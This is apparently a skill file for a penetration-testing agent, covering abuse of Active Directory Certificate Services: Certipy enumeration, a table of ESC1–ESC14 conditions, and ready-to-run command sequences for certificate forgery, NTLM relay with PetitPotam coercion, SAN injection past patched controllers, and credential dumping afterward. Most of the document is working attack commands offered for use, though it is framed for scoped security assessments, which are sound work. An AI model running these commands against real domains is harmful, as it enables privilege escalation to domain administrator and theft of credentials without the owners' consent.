---
name: windows-adcs
description: Active Directory Certificate Services abuse — Certipy find, ESC1–ESC8 plus ESC7/9/10/11/13/14, Shadow Credentials, PKINIT auth. Use when a CA, certsrv HTTP, or certificate templates are in scope.
metadata:
  version: '1.0'
---

# AD Certificate Services

Unauth: note HTTP `http://<ca>/certsrv/` (IIS basic auth) and whether web enrollment is on. Auth: always run `certipy find` before ESC exploits.

```
certipy find -u '<user>@<domain>' -p '<pass>' -dc-ip <dc-ip> -vulnerable -stdout
certipy find -u '<user>@<domain>' -p '<pass>' -dc-ip <dc-ip> -scheme ldap
```

Record CA name, templates, and flags as domain knowledge. File a finding per **exploitable** template with the ESC id and proof (issued cert or Certipy output).

## ESC map

| ID | Condition (simplified) | Abuse |
|---|---|---|
| **ESC1** | Enrollee supplies SAN + client auth EKU + enrollee can enroll | `certipy req -template <T> -upn administrator@<domain>` then `certipy auth -pfx` |
| **ESC2** | Any purpose / no EKU | Same as ESC1 if SAN controllable |
| **ESC3** | Enrollment agent template | Request agent cert, then request on behalf of admin |
| **ESC4** | Dangerous ACL on template (`WriteOwner`/`WriteDACL`/`WriteProperty`) | Make it ESC1 (`certipy template -save-old`), enroll, restore |
| **ESC6** | `EDITF_ATTRIBUTESUBJECTALTNAME2` on CA | SAN in request attributes even if template forbids it |
| **ESC7** | ManageCA / Manage Certificates on CA | Enable SAN flag or approve pending; treat as CA admin |
| **ESC8** | HTTP web enrollment + NTLM + relay | Coerce DC → `ntlmrelayx --adcs` / `certipy relay -ca <ca> -template DomainController` |
| **ESC9** | `StrongMapping` disabled + UPN writable | Shadow-cred style UPN swap |
| **ESC10** | Weak certificate mapping (UPN/DNS) | Similar mapping abuse |
| **ESC11** | IF_ENFORCEENCRYPTICERTREQUEST off | Relaying to ICertPassage RPC |
| **ESC13** | Group-linked issuance policy OID | Enroll → group membership via cert |
| **ESC14** | Weak alt-security-identities mapping | Explicit mapping abuse |

ESC8 is the usual **unauth-to-DA** path when combined with PetitPotam/PrinterBug and a template like `DomainController`. Load `windows-coerce-relay`.

## ESC1 sketch

```
certipy req -u '<user>@<domain>' -p '<pass>' -ca '<CA>' -template '<Vulnerable>' \
  -upn 'administrator@<domain>' -dc-ip <dc-ip>
certipy auth -pfx administrator.pfx -dc-ip <dc-ip>
```

Then `secretsdump` / `nxc smb -k` as that principal.

## ESC8 sketch

```
# listener
certipy relay -ca <ca-fqdn> -template DomainController
# or
ntlmrelayx.py -t http://<ca>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
# coerce
petitpotam.py <listener-ip> <dc-fqdn>
# auth
certipy auth -pfx <dc$>.pfx -dc-ip <dc-ip>
```

Requires: web enrollment, NTLM allowed, useful template, coerce to a host that authenticates as DC$.

**On patched DCs, coerced DC$ cannot be relayed to the DC's own certsrv** (NTLM
loopback detection → 401). Two ways around it:

- Relay a **workstation$** (coerce it instead) to the DC's ADCS endpoint.
- **ESC6 SAN injection** (preferred when the CA has `EDITF_ATTRIBUTESUBJECTALTNAME2`):
  relay any coerced machine account and inject a privileged SAN — you never need DC$:

  ```
  /opt/relayenv/bin/ntlmrelayx.py -t http://<ca>/certsrv/certfnsh.asp -smb2support \
      --adcs --template Machine --altname administrator@<domain>
  # coerce a workstation to the listener, then:
  /opt/relayenv/bin/certipy auth -pfx administrator.pfx -dc-ip <dc-ip>
  ```

  Note: on KDCs in certificate-mapping **enforcement** mode the issued cert's SID
  extension wins over the SAN — this path worked against Server 2019 in
  compatibility mode; if `certipy auth` maps to the wrong principal, check
  `StrongCertificateBindingEnforcement`.

Tooling: use `/opt/relayenv/bin/ntlmrelayx.py` for `--adcs` (global impacket
crashes on pyOpenSSL≥23.2) and `/opt/relayenv/bin/certipy` for auth/find.
`certipy relay` is broken with impacket 0.13. See `windows-coerce-relay` for
listener/backgrounding details.

## Shadow Credentials vs ADCS

Shadow Credentials (`certipy shadow auto`) writes Key Trust on an object — LDAP ACL, not a template. Still PKINIT. See `windows-ldap-acl`.

## After a PFX

```
certipy auth -pfx user.pfx -dc-ip <dc-ip>          # NT hash + TGT
certipy cert -pfx user.pfx -nokey -out user.crt
```

Use `-ldap-shell` only if you need an interactive LDAP bind.

## Extra

- **CA backup / ManageCA:** can mint arbitrary certs — finding even without ESC1.
- **User/machine autoenroll + client auth:** often ESC1-adjacent.
- **NTLM to HTTPS enrollment:** channel binding may block ESC8; try HTTP or ESC11.
- Do not leave a modified template (ESC4) unrestored.
